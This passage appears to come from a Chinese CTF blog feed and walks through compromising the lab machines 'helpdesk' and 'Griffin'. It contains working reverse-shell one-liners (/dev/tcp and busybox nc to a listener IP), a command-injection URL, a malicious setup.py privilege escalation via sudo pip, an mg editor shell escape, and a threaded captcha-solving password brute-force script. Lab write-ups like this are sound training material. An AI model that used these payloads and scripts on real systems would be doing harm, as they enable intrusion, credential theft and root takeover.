*   **UNIX Socket**ÔºöËøôÊòØ‰∏ÄÁßçÂú®Âêå‰∏ÄÂè∞Êú∫Âô®‰∏äÁöÑËøõÁ®ãÈó¥ÈÄö‰ø°ÔºàIPCÔºâÊú∫Âà∂„ÄÇ ÂÆÉ‰∏çÁªèËøáÁΩëÁªúÂçèËÆÆÊ†àÔºåËÄåÊòØÈÄöËøáÊñá‰ª∂Á≥ªÁªüËøõË°åÈÄö‰ø°ÔºåÂõ†Ê≠§ÊïàÁéáÊõ¥È´ò„ÄÇ
*   **ÊºèÊ¥ûÂàÜÊûê**Ôºö`serve.sh` ËÑöÊú¨‰ª• `helpdesk` Áî®Êà∑Ë∫´‰ªΩËøêË°åÔºåÂπ∂‰ΩøÁî® `socat` ÂàõÂª∫‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `helpdesk.sock` ÁöÑUNIXÂ•óÊé•Â≠ó„ÄÇ ÂÖ≥ÈîÆÂú®‰∫é `mode=777` ÂèÇÊï∞ÔºåÂÆÉ‰ΩøÂæó‰ªª‰ΩïÁî®Êà∑ÈÉΩÂØπËøô‰∏™socketÊñá‰ª∂ÊúâËØª„ÄÅÂÜô„ÄÅÊâßË°åÊùÉÈôê„ÄÇÂΩìÊúâÊï∞ÊçÆÂèëÈÄÅÂà∞Ëøô‰∏™socketÊó∂Ôºå`EXEC:/opt/helpdesk-socket/handler.sh` ‰ºöË¢´Ëß¶ÂèëÔºå`handler.sh` ‰ºöÂ∞ÜÊé•Êî∂Âà∞ÁöÑÊï∞ÊçÆ‰Ωú‰∏∫ÂëΩ‰ª§Áõ¥Êé•Áî® `/bin/bash -c` ÊâßË°å„ÄÇ

Âà©Áî®Ëøô‰∏™ÊºèÊ¥ûÔºåÂ∞Ü‰∏Ä‰∏™ÂèçÂºπshellÁöÑÂëΩ‰ª§ÈÄöËøá `socat` ÂèëÈÄÅÂà∞ `helpdesk.sock`Ôºå‰ªéËÄå‰ª• `helpdesk` Áî®Êà∑ÊùÉÈôêÊâßË°å„ÄÇ

Âú®Kali‰∏äÈáçÊñ∞ÁõëÂê¨8888Á´ØÂè£ÔºåÁÑ∂ÂêéÂú® `www-data` shell‰∏≠ÊâßË°åÔºö

```bash
www-data@helpdesk:/opt/helpdesk-socket$ echo '/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1' | socat - /opt/helpdesk-socket/helpdesk.sock
```

ÊàêÂäüËé∑Âæó `helpdesk` Áî®Êà∑ÁöÑshell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 53106
...
helpdesk@helpdesk:/$ id
uid=1001(helpdesk) gid=1001(helpdesk) groups=1001(helpdesk)
```

## **2. helpdesk -&gt; root**

‰ΩøÁî® `sudo -l` Êü•Áúã `helpdesk` Áî®Êà∑ÁöÑsudoÊùÉÈôê„ÄÇ

```bash
helpdesk@helpdesk:/$ sudo -l
...
User helpdesk may run the following commands on helpdesk:
    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *
```

ÂèëÁé∞ `helpdesk` Áî®Êà∑ÂèØ‰ª•ÂÖçÂØÜ‰ª•rootÊùÉÈôêÊâßË°å `pip3 install` ÂëΩ‰ª§„ÄÇËøôÊòØ‰∏Ä‰∏™Â∑≤Áü•ÁöÑÊèêÊùÉÂêëÈáè„ÄÇ ÂΩì`pip install`ÂÆâË£Ö‰∏Ä‰∏™Êú¨Âú∞ÁõÆÂΩïÊó∂ÔºåÂÆÉ‰ºöÊâßË°åËØ•ÁõÆÂΩï‰∏ãÁöÑ`setup.py`Êñá‰ª∂„ÄÇ Âõ†Ê≠§ÔºåÊàë‰ª¨ÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑ`setup.py`Êñá‰ª∂ÔºåÂú®ÂÖ∂‰∏≠ÂåÖÂê´ÊèêÊùÉÂëΩ‰ª§„ÄÇ

ÂàõÂª∫‰∏Ä‰∏™ÂåÖÂê´ÊèêÊùÉpayloadÁöÑ `setup.py` Êñá‰ª∂ÔºåËØ•payload‰ºöÁªô `/bin/bash` Ê∑ªÂä†SUIDÊùÉÈôê„ÄÇ

```bash
helpdesk@helpdesk:~$ mkdir 1;cd 1
helpdesk@helpdesk:~/1$ echo 'import os; os.system('chmod +s /bin/bash')' &gt; setup.py
helpdesk@helpdesk:~/1$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

‰ΩøÁî® `sudo` ÊâßË°å `pip3 install` Êù•ÂÆâË£ÖÂΩìÂâçÁõÆÂΩï„ÄÇ

```bash
helpdesk@helpdesk:~/1$ sudo /usr/bin/pip3 install --break-system-packages .
Processing /home/helpdesk/1
  Preparing metadata (setup.py) ... done
...
helpdesk@helpdesk:~/1$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

ÂèØ‰ª•ÁúãÂà∞ `/bin/bash` Â∑≤ÁªèÊàêÂäüË¢´ËÆæÁΩÆ‰∫ÜSUID‰Ωç„ÄÇÁé∞Âú®ÔºåÊâßË°å `bash -p` Âç≥ÂèØËé∑ÂæórootÊùÉÈôêÁöÑshell„ÄÇ

```bash
helpdesk@helpdesk:~/1$ bash -p
bash-5.2# id
uid=1001(helpdesk) gid=1001(helpdesk) euid=0(root) egid=0(root) groups=0(root),1001(helpdesk)
bash-5.2# cat /root/root.txt /home/helpdesk/user.txt 
flag{request_has_been_escalated}
flag{ticket_approved_by_thedesk}
```

ÊàêÂäüËé∑ÂèñrootÊùÉÈôêÂπ∂ËØªÂèñÊúÄÁªàÁöÑflag„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_helpdesk.html</guid><pubDate>Sat, 23 Aug 2025 15:33:55 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Griffin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Griffin.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

È¶ñÂÖàÔºå‰ΩøÁî®`arp-scan`Â∑•ÂÖ∑ÂØπÊú¨Âú∞ÁΩëÁªúËøõË°åÊâ´ÊèèÔºå‰ª•ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.132 08:00:27:9e:89:aa       PCS Systemtechnik GmbH
...
```

Á°ÆÂÆöÁõÆÊ†áIPÂú∞ÂùÄ‰∏∫ `192.168.205.132`„ÄÇ

Êé•‰∏ãÊù•Ôºå‰ΩøÁî®`nmap`ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÁ´ØÂè£ÂíåÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 09:24 EDT
Nmap scan report for novice.com (192.168.205.132)
Host is up (0.00038s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:9E:89:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÂºÄÊîæ‰∫Ü`22`Á´ØÂè£ÔºàSSHÊúçÂä°ÔºâÂíå`8080`Á´ØÂè£ÔºàHTTP‰ª£ÁêÜÊúçÂä°Ôºâ„ÄÇ

# **‰∫å„ÄÅWebÊ∏óÈÄè‰∏éÊºèÊ¥ûÂà©Áî®**

## **2.1 WebÁõÆÂΩïÊé¢Êµã**

ËÆøÈóÆ`http://192.168.205.132:8080/`ÔºåÈ°µÈù¢ÊòæÁ§∫Ê¨¢Ëøé‰ø°ÊÅØ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.132:8080/
Yo, welcome to GriffinCorp, the coolest company in Quahog!
Peter Griffin‚Äôs got your back with top-notch service.
Don‚Äôt mess this up, or Lois is gonna be pissed!
```

‰ΩøÁî®`dirsearch`Â∑•ÂÖ∑ËøõË°åÁõÆÂΩïÊâ´ÊèèÔºåÂèëÁé∞‰∫Ü`/info`Âíå`/debug`‰∏§‰∏™Ë∑ØÂæÑ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ dirsearch -u http://192.168.205.132:8080
...
[09:28:14] 403 -   23B  - /debug
[09:28:18] 200 -   49B  - /info
...
```

## **2.2 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÔºàRCEÔºâ**

ËÆøÈóÆ`/info`Ë∑ØÂæÑÔºåÂèëÁé∞ÂÆÉ‰ºöËøîÂõû‰∏Ä‰∏™ËØäÊñ≠‰ª§Áâå„ÄÇÂ§öÊ¨°ËÆøÈóÆÂêéÂèëÁé∞ÔºåËØ•‰ª§ÁâåÊòØÈöèÊú∫ÂèòÂåñÁöÑ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.132:8080/info
System Info: Diagnostic token = BetaToken123
...
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.132:8080/info
System Info: Diagnostic token = CyberCorpDebug123
```

ËÆøÈóÆ`/debug`Ë∑ØÂæÑÊèêÁ§∫Áº∫Â∞ë`token`ÂèÇÊï∞„ÄÇÂ∞ùËØïÂ∞Ü‰ªé`/info`Ëé∑ÂèñÁöÑ‰ª§Áâå‰Ωú‰∏∫ÂèÇÊï∞Êèê‰æõÔºåÈ°µÈù¢ÊèêÁ§∫Áº∫Â∞ë`run`ÂëΩ‰ª§„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123'
Missing run command
```

ËøôË°®ÊòéËØ•Á´ØÁÇπÂèØËÉΩÂ≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û„ÄÇÈÄöËøá`run`ÂèÇÊï∞‰º†ÈÄí`id`ÂëΩ‰ª§ËøõË°åÊµãËØïÔºåÊàêÂäüÊâßË°åÂπ∂ËøîÂõû‰∫ÜÁªìÊûú„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123&amp;run=id'
uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
```

**Ê≥®ÊÑè**ÔºöÁî±‰∫é‰ª§ÁâåÊòØÈöèÊú∫ÁöÑÔºåÈúÄË¶ÅÂÖàËÆøÈóÆ`/info`Ëé∑ÂèñÊúâÊïà‰ª§ÁâåÔºåÂÜçÁ´ãÂç≥Áî®‰∫é`/debug`Á´ØÁÇπ„ÄÇ

## **2.3 Ëé∑ÂèñÂèçÂêëShell**

Âú®Kali‰∏äËÆæÁΩÆ`netcat`ÁõëÂê¨8888Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
```

Âà©Áî®Â∑≤ÂèëÁé∞ÁöÑRCEÊºèÊ¥ûÔºåÊâßË°å‰∏Ä‰∏™ÂèçÂêëshellÂëΩ‰ª§„ÄÇËøôÈáå‰ΩøÁî®`busybox nc`Êù•Âª∫Á´ãËøûÊé•„ÄÇ

```bash
http://192.168.205.132:8080/debug?token=CyberCorpDebug123&amp;run=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash
```

ÊàêÂäüÊé•Êî∂Âà∞ÂèçÂêëshellÔºåÂΩìÂâçÁî®Êà∑‰∏∫`lois`„ÄÇ

```bash
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 45526
id
uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
```

ÈöèÂêéÔºåÈÄöËøá‰∏ÄÁ≥ªÂàóÂëΩ‰ª§Â∞ÜÁÆÄÊòìshellÂçáÁ∫ß‰∏∫ÂäüËÉΩÂÆåÂñÑÁöÑ‰∫§‰∫íÂºèTTY„ÄÇ

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **3.1 Êú¨Âú∞Êûö‰∏æ**

Ëé∑Âèñ`user.txt`‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™flag„ÄÇ

```bash
lois@Griffin:/home/lois$ cat user.txt
flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
```

‰ΩøÁî®`sudo -l`Ê£ÄÊü•`lois`Áî®Êà∑ÁöÑsudoÊùÉÈôê„ÄÇ

```bash
lois@Griffin:/home/lois$ sudo -l
...
User lois may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/cat /root/startup.log
```

`lois`ÂèØ‰ª•ÂÖçÂØÜ‰ΩøÁî®`cat`ÂëΩ‰ª§ËØªÂèñ`/root/startup.log`„ÄÇÊ£ÄÊü•ÁΩëÁªúËøûÊé•ÊÉÖÂÜµÔºåÂèëÁé∞Èô§‰∫ÜÂÖ¨ÁΩëÁöÑ`8080`Âíå`22`Á´ØÂè£Â§ñÔºåËøòÂú®Êú¨Âú∞`127.0.0.1`‰∏äÁõëÂê¨‰∫ÜÂ§ö‰∏™Á´ØÂè£ÔºåÂåÖÊã¨‰∏Ä‰∏™`80`Á´ØÂè£„ÄÇ

```bash
lois@Griffin:/opt$ ss -tnlp
State                   Recv-Q                  Send-Q               Local Address:Port
...
LISTEN                  0                       5                          0.0.0.0:8080
LISTEN                  0                       128                        127.0.0.1:80
...
```

## **3.2 Á´ØÂè£ËΩ¨Âèë‰∏éWeb‰∫åÊ¨°Ê∏óÈÄè**

Áî±‰∫é`80`Á´ØÂè£Âè™Âú®Êú¨Âú∞ÁõëÂê¨ÔºåÊàë‰ª¨Êó†Ê≥ïÁõ¥Êé•ËÆøÈóÆ„ÄÇ‰ΩøÁî®`socat`Â∞ÜÊú¨Âú∞ÁöÑ`80`Á´ØÂè£ËΩ¨ÂèëÂà∞`8000`Á´ØÂè£Ôºå‰ª•‰æø‰ªéÂ§ñÈÉ®ËÆøÈóÆ„ÄÇ

```bash
lois@Griffin:/opt$ socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &amp;
```

ËÆøÈóÆËΩ¨ÂèëÂêéÁöÑ`http://192.168.205.132:8000/`ÔºåËøôÊòØ‰∏Ä‰∏™ÂÖ≥‰∫é'Family Guy'ÁöÑÁΩëÁ´ô„ÄÇÂÜçÊ¨°‰ΩøÁî®`dirsearch`ËøõË°åÁõÆÂΩïÊâ´ÊèèÔºåÂèëÁé∞`robots.txt`Êñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.132:8000/robots.txt
User-agent: *
Disallow: /family

...

rockyou: world's best dictionary, hands down!
```

`robots.txt`Á¶ÅÊ≠¢ËÆøÈóÆ`/family`Ë∑ØÂæÑÔºåÂπ∂ÊöóÁ§∫`rockyou`Â≠óÂÖ∏ÂèØËÉΩ‰ºöÊ¥æ‰∏äÁî®Âú∫„ÄÇ

## **3.3 ÁôªÂΩïÁàÜÁ†¥ (lois -&gt; meg)**

ËÆøÈóÆ`/family`Ë∑ØÂæÑÊòØ‰∏Ä‰∏™ÁôªÂΩïÈ°µÈù¢ÔºåÂåÖÂê´Áî®Êà∑Âêç„ÄÅÂØÜÁ†ÅÂíåÈ™åËØÅÁ†Å„ÄÇÈ°µÈù¢ÊèêÁ§∫`brian`Áî®Êà∑ÊØè5Ê¨°Â∞ùËØïÂêé‰ºöË¢´ÈîÅÂÆöÔºåÈúÄË¶ÅÈáçÁΩÆ„ÄÇ

‰∏∫Ê≠§ÔºåÁºñÂÜô‰∫Ü‰∏Ä‰∏™PythonËÑöÊú¨Ôºå‰ΩøÁî®`ddddocr`Â∫ìËØÜÂà´È™åËØÅÁ†ÅÔºåÂπ∂ÁªìÂêàÂ≠óÂÖ∏ÂØπ`brian`Áî®Êà∑ÁöÑÂØÜÁ†ÅËøõË°åÁàÜÁ†¥„ÄÇËÑöÊú¨ÈÄªËæëÂåÖÊã¨Ëá™Âä®ËØÜÂà´È™åËØÅÁ†Å„ÄÅÂ§ÑÁêÜË¥¶Êà∑ÈîÅÂÆö‰ª•ÂèäÂ§öÁ∫øÁ®ãÁàÜÁ†¥„ÄÇ

```python
import requests
import ddddocr
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
import queue

url = 'http://192.168.205.132:8000/family/'
cap_url = 'http://192.168.205.132:8000/family/captcha.php'
rst_url = 'http://192.168.205.132:8000/family/?reset=1'
user = 'brian'
dict_file = '5000q.txt'
max_workers = 2

ocr = ddddocr.DdddOcr()
pw_q = queue.Queue()
found = queue.Queue(maxsize=1)
pr_lock = Lock()
total = 0
MAX_RETRY = 3   # ÊØè‰∏™ÂØÜÁ†ÅÊúÄÂ§öÈáçËØï 3 Ê¨°


def worker():
    global total
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',
        'Accept': 'text/html,*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.2',
        'Connection': 'keep-alive',
        'Referer': url,
        'Upgrade-Insecure-Requests': '1'
    })

    tries = 0
    while True:
        if not found.empty():
            return
        try:
            pw, retry = pw_q.get_nowait()
            tries += 1

            cap_img = s.get(cap_url, timeout=5).content
            cap = ocr.classification(cap_img).strip()

            if len(cap) != 4:
                if retry &lt; MAX_RETRY:
                    pw_q.put((pw, retry + 1))
                continue

            r = s.post(url, data={'username': user, 'password': pw, 'captcha': cap}, timeout=5)

            with pr_lock:
                total += 1
                n = total

            res = r.text

            # Ë¥¶Âè∑Ë¢´ÈîÅÂÆö
            if 'ACCOUNT TEMPORARILY LOCKED!' in res:
                with pr_lock:
                    print(f'[{n:4d}] üö´ {pw:&lt;12} | üî§ {cap} | ÂéüÂõ†: Ë¥¶Âè∑Ë¢´ÈîÅÂÆö ‚Üí reset')
                try:
                    s.get(rst_url, timeout=5)
                except requests.RequestException:
                    pass
                if retry &lt; MAX_RETRY:
                    pw_q.put((pw, retry + 1))
                continue

            # Á†¥Ëß£ÊàêÂäü
            if 'Invalid security code!' not in res and 'Incorrect password!' not in res:
                found.put((user, pw, cap, n))
                with pr_lock:
                    print(f'\n[+] üéâ Á†¥Ëß£ÊàêÂäüÔºÅüéâ\n    Áî®Êà∑Âêç: {user}\n    ÂØÜÁ†Å: {pw}\n    È™åËØÅÁ†Å: {cap}\n    Â∞ùËØï: {n}')
                return

            # Â§±Ë¥•ÂéüÂõ†ËæìÂá∫
            reason = 'Êú™Áü•ÂéüÂõ†'
            if 'Invalid security code!' in res:
                reason = 'È™åËØÅÁ†ÅÈîôËØØ'
            elif 'Incorrect password!' in res:
                reason = 'ÂØÜÁ†ÅÈîôËØØ'

            with pr_lock:
                print(f'[{n:4d}] ‚ùå {pw:&lt;12} | üî§ {cap} | ÂéüÂõ†: {reason}')

        except queue.Empty:
            break
        except requests.RequestException:
            if retry &lt; MAX_RETRY:
                pw_q.put((pw, retry + 1))
        except Exception as e:
            with pr_lock:
                print(f'[!] Á∫øÁ®ãÂºÇÂ∏∏: {e}')


if __name__ == '__main__':
    try:
        with open(dict_file, encoding='utf-8') as f:
            for p in [x.strip() for x in f if x.strip()]:
                pw_q.put((p, 0))   # (ÂØÜÁ†Å, ÈáçËØïÊ¨°Êï∞)
    except:
        print(f'[-] Â≠óÂÖ∏Êú™ÊâæÂà∞: {dict_file}')
        exit(1)

    print(f'[*] ÂºÄÂßãÁàÜÁ†¥ | Áî®Êà∑: {user} | Â≠óÂÖ∏: {dict_file} | ÊÄªÊï∞: {pw_q.qsize()} | Á∫øÁ®ã: {max_workers}\n')

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        list(ex.map(lambda _: worker(), range(max_workers)))

    if found.empty():
        print(f'\n[-] ‚ùå ÁàÜÁ†¥Â§±Ë¥•')
```

ÁªèËøáÁàÜÁ†¥ÔºåÊàêÂäüËé∑Âæó`brian`Áî®Êà∑ÁöÑÂØÜÁ†Å„ÄÇ

```
[+] üéâ Á†¥Ëß£ÊàêÂäüÔºÅüéâ
    Áî®Êà∑Âêç: brian
    ÂØÜÁ†Å: savannah
    È™åËØÅÁ†Å: 8upj
    Â∞ùËØï: 555
```

‰ΩøÁî®`brian:savannah`ÁôªÂΩïÂêéÔºåÂú®Cookie‰∏≠ÂèëÁé∞‰∏Ä‰∏™`auth_token`„ÄÇÁªèËøáÂàÜÊûêÔºåËØ•tokenÊ≥ÑÈú≤‰∫Ü`meg`Áî®Êà∑ÁöÑÂá≠ÊçÆ„ÄÇ

```
meg:lovelyfamily
```

‰ΩøÁî®`su`ÂëΩ‰ª§ÂíåËØ•ÂØÜÁ†ÅÊàêÂäüÂàáÊç¢Âà∞`meg`Áî®Êà∑„ÄÇ

```bash
lois@Griffin:/opt$ su meg
Password: lovelyfamily
meg@Griffin:~$ id
uid=1001(meg) gid=1001(meg) groups=1001(meg)
```

## **3.4 SudoÊèêÊùÉ (meg -&gt; peter)**

Ê£ÄÊü•`meg`Áî®Êà∑ÁöÑsudoÊùÉÈôê„ÄÇ

```bash
meg@Griffin:~$ sudo -l
...
User meg may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/python3 /root/game.py
```

`meg`ÂèØ‰ª•ÂÖçÂØÜ‰ª•rootÊùÉÈôêÊâßË°å`/root/game.py`ËÑöÊú¨„ÄÇÊâßË°åËØ•ËÑöÊú¨ÂêéÔºåÂÆÉ‰ºöÂú®`6666`Á´ØÂè£‰∏äÂêØÂä®‰∏Ä‰∏™ÁõëÂê¨ÊúçÂä°„ÄÇ

```bash
meg@Griffin:~$ sudo /usr/bin/python3 /root/game.py
Server listening on port 6666...
```

ËØ•ÊúçÂä°ËÆæËÆ°‰∫Ü‰∏â‰∏™ÊåëÊàòÔºöÊï∞Â≠¶ËÆ°ÁÆó„ÄÅÂáØÊííÂØÜÁ†ÅËß£ÂØÜÂíåMD5ÂìàÂ∏åËÆ°ÁÆóÔºà3sÊó∂Èó¥ÈôêÂà∂ÔºâÔºåÊâÄ‰ª•ÈúÄË¶ÅÁºñÂÜô‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØËÑöÊú¨‰∏éËØ•ÊúçÂä°ËøõË°å‰∫§‰∫í„ÄÇ

```python
import socket
import re
import hashlib

s = socket.socket()
s.connect(('192.168.205.132', 6666))

data = s.recv(4096).decode()
print(data)

match = re.search(r'\((\d+) \* (\d+)\) // (\d+)', data)
a, b, c = map(int, match.groups())
ans1 = str((a * b) // c)
s.send((ans1 + '\n').encode())

data = s.recv(4096).decode()
print(data)
s.send(b'flag{fakeflag}\n')

data = s.recv(4096).decode()
print(data)
x = re.search(r'MD5\((\d+) \+ UNIX timestamp: (\d+)\)', data)
param = x.group(1) + x.group(2)
md5_hash = hashlib.md5(param.encode()).hexdigest()
s.send((md5_hash + '\n').encode())

print(s.recv(4096).decode())
s.close()
```

ÊàêÂäüÈÄöËøáÊâÄÊúâÊåëÊàòÂêéÔºåÊúçÂä°ËøîÂõû‰∫Ü‰∏Ä‰∏™ÂØÜÁ†Å„ÄÇ

```
Congratulations! Flag: HMV{Wow!VeryFuuuuuny!}
```

Ëøô‰∏™ÂØÜÁ†Å`Wow!VeryFuuuuuny!`ÂÆûÈôÖ‰∏äÊòØ`peter`Áî®Êà∑ÁöÑSSHÂØÜÁ†Å„ÄÇ‰ΩøÁî®ËØ•ÂØÜÁ†ÅÊàêÂäüÁôªÂΩï`peter`Ë¥¶Êà∑„ÄÇ

```bash
‚îå‚îÄ‚îÄ(pythonvenv)‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh peter@192.168.205.132
peter@192.168.205.132's password: Wow!VeryFuuuuuny!
...
peter@Griffin:~$ id
uid=1003(peter) gid=1003(peter) groups=1003(peter)
```

## **3.5 SudoÊèêÊùÉ (peter -&gt; root)**

ÊúÄÂêéÔºåÊ£ÄÊü•`peter`Áî®Êà∑ÁöÑsudoÊùÉÈôê„ÄÇ

```bash
peter@Griffin:~$ sudo -l
...
User peter may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/mg
```

`peter`ÂèØ‰ª•ÂÖçÂØÜ‰ª•rootÊùÉÈôêËøêË°åÊñáÊú¨ÁºñËæëÂô®`mg`„ÄÇ`mg`ÁºñËæëÂô®ÂèØ‰ª•ÈÄöËøáÊâßË°åÂ§ñÈÉ®shellÂëΩ‰ª§Êù•ËøõË°åÊèêÊùÉ„ÄÇ

1.  ÂàõÂª∫‰∏Ä‰∏™ËÑöÊú¨`/tmp/a`ÔºåÂÜÖÂÆπ‰∏∫Áªô`/bin/bash`Ê∑ªÂä†SUIDÊùÉÈôê‰ΩçÔºåÂπ∂Ëµã‰∫àÂÖ∂ÊâßË°åÊùÉÈôê„ÄÇ

    ```bash
    peter@Griffin:~$ echo 'chmod +s /bin/bash' &gt; /tmp/a
    peter@Griffin:~$ chmod +x /tmp/a
    ```

2.  ‰ª•sudoÊùÉÈôêËøêË°å`mg`„ÄÇ

    ```bash
    peter@Griffin:~$ sudo /usr/bin/mg
    ```

3.  Âú®`mg`ÁºñËæëÂô®‰∏≠ÔºåÊåâ`Alt-x`ÔºåËæìÂÖ•`shell-command`Âπ∂ÊåâÂõûËΩ¶„ÄÇ
4.  Âú®Êñ∞ÁöÑÊèêÁ§∫Á¨¶‰∏ãÔºåËæìÂÖ•`/tmp/a`Âπ∂ÂõûËΩ¶ÔºåÊâßË°åÊàë‰ª¨ÁöÑËÑöÊú¨„ÄÇ
5.  Êåâ`Ctrl-x` `Ctrl-c`ÈÄÄÂá∫`mg`ÁºñËæëÂô®„ÄÇ

Ê≠§Êó∂Ôºå`/bin/bash`Â∑≤Ë¢´ËÆæÁΩÆ‰∫ÜSUID‰Ωç„ÄÇ‰ΩøÁî®`-p`ÂèÇÊï∞ËøêË°åbash‰ª•‰øùÁïôÊúâÊïàÁî®Êà∑IDÔºàeuidÔºâ„ÄÇ

```bash
peter@Griffin:~$ bash -p
bash-5.0# id
uid=1003(peter) gid=1003(peter) euid=0(root) egid=0(root) groups=0(root),1003(peter)
```

ÊàêÂäüËé∑ÂæórootÊùÉÈôê„ÄÇËØªÂèñÊúÄÁªàÁöÑflag„ÄÇ

```bash
bash-5.0# cat /root/root.txt /home/lois/user.txt
flag{root-be93b7d7f0a30d5159c0460874e6e015}
flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Griffin.html</guid><pubDate>Sat, 23 Aug 2025 14:28:39 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_novice-admin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_novice-admin.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1.1 ‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÔºåÂú®ÂΩìÂâçÂÜÖÁΩëÁéØÂ¢É‰∏≠ËøõË°å‰∏ªÊú∫ÂèëÁé∞Ôºå‰ª•Á°ÆÂÆöÊΩúÂú®ÁöÑÊîªÂáªÁõÆÊ†á„ÄÇÊàë‰ª¨‰ΩøÁî® `arp-scan` ÂØπÊú¨Âú∞ `eth0` ÁΩëÂç°ÊâÄÂú®ÁöÑ `192.168.205.0/24` ÁΩëÊÆµËøõË°åÊâ´ÊèèÔºåÂØªÊâæÂ≠òÊ¥ª‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l      
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.132 00:0c:29:19:38:d9       VMware, Inc.
192.168.205.254 00:50:56:e9:e4:2e       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.005 seconds (127.68 hosts/sec). 4 responded
```

